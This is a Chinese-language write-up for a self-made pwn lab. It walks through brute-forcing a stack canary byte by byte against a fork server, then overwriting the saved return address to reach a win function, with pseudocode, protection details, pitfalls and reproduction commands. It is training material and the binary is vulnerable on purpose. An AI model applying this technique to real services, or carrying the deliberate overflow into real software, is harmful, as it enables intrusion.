# lab_canary_bruteforce —— 自造 canary 逐字节爆破靶场（L5）

> **这是自造实验，不是真实赛题。** 目的：复现真实赛题的 **fork server** 模型，
> 把“canary 逐字节爆破 → 覆盖 saved RIP → ret2win”整条链跑通。

---

## 1. 题目行为

```text
main:
  while (1) { pid = fork(); if (pid == 0) { vuln(); puts("SURVIVED"); _exit(0); } waitpid(...); }

vuln:
  char buf[0x40];
  write(1, "payload: ", 9);
  read(0, buf, 0x100);        ← 栈溢出 0x100 > 0x40
```

保护（`checksec`）：

| 项 | 值 |
| --- | --- |
| 架构 | amd64，动态链接，glibc 2.43 |
| PIE | 无（基址 `0x400000`） |
| canary | **有**（`-fstack-protector-strong`，本题的主角） |
| NX | 开启 |
| RELRO | Partial |

```text
win        0x401256    puts + system("cat flag.txt")
偏移       0x48         buf(0x40) + 8 字节对齐 → canary 起点
saved RIP  0x58         canary 8 + saved rbp 8 之后
```

## 2. 为什么必须爆破（而不是泄漏）

| 排除项 | 原因 |
| --- | --- |
| 泄漏 canary | 程序没有任何输出缓冲区内容的点（`read` 后直接返回），没有 `printf("%s")` |
| 改写 `__stack_chk_fail@got` | 不是 PIE，但需要任意写；本题只有栈溢出 |
| 一次猜中 | 8 字节里 7 字节随机，一次命中概率 2^-56 |

所以只能靠 **fork 复用同一个 canary** 做逐字节试错：每次最多 256 次，7 字节合计
期望约 900 次连接。

## 3. 利用链

```text
canary[0] = b"\x00"                       # x86-64 的 canary 最低字节恒为 0
for i in 1..7:
    for b in 0..255:
        send(b"A"*0x48 + canary + bytes([b]))
        本轮 child 若打印 "SURVIVED" → 该字节正确（否则只有 stack smashing 报错）
send(b"A"*0x48 + canary + b"B"*8 + p64(ret) + p64(win))
```

判据只看 **"SURVIVED" 是否出现**，不要看提示符：父进程无论如何都会 fork 下一个
child 并再打印 `payload: `，光看提示符无法区分对错。

## 4. 坑点（本次实测踩到的）

1. **栈 16 字节对齐**：直接 `ret` 到 `win()` 时 `rsp % 16 == 0`，而 `win` 里第一次
   调 `system@plt` 会走 `_dl_runtime_resolve`（要求 call 语义，即 `rsp % 16 == 8`）。
   现象很迷惑：`[+] canary bypassed...` 打出来了，但 `cat flag.txt` 没有任何输出。
   解决办法是 payload 里 **先垫一个 `ret` gadget** 再进 `win`。
2. **每轮必须等响应再发**：`read(0, buf, 0x100)` 只吃当前管道里已有的字节，如果
   客户端连发两轮，第二次的 payload 会被同一 child 吞掉，canary 就会“永远猜不中”。
3. **判据别依赖 stderr 顺序**：`*** stack smashing detected ***` 来自 stderr，
   pwntools 默认把 stderr 合到 stdout（`process()`），所以能一起 `recvuntil`；
   若改成 `stderr=STDOUT` 之外的配置要重新确认。
4. **耗时**：单次完整爆破约 20 s（~900 次 fork），`verify_all.sh` 给本题留了 180 s。
5. `-fstack-protector-strong` 必须保留，否则 lab 退化成 ret2text，失去意义。
6. 编译时那条 `-Wstringop-overflow`（`read 0x100` 写进 `char[0x40]`）**就是本题漏洞本身**，
   Makefile 里用 `-Wno-stringop-overflow` 静音，别把 `read` 长度"修"小。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn_Writeups/labs/lab_canary_bruteforce'
source ../../.venv/bin/activate
make
printf '__PWNED__{canary_ok}\n' > flag.txt
python exp.py                          # 约 20 s，期望输出 __PWNED__{canary_ok}
```

文件：`chal`（`make` 产物，ELF 64 位）+ `exp.py` + `src/chal.c`。
EXP 默认 `process('./chal')`；想跑远程时用
`socat TCP-LISTEN:10005,reuseaddr,fork EXEC:./chal` 起服务，再
`HOST=127.0.0.1 PORT=10005 python exp.py`（两个环境变量都支持）。

## 6. 识别卡

```text
有 canary + 溢出长度足够 + 服务每次连接重启（fork server）
  -> canary 逐字节爆破：LSB 已知 \x00，其余 7 字节各最多 256 次，判据是“进程是否正常返回”
区分：能泄漏 canary（如 repeater/canary3 的 puts(buf)）时应优先泄漏，爆破是兜底
recurring 细节：ret2win 前垫 ret gadget 解决 16 字节对齐
```
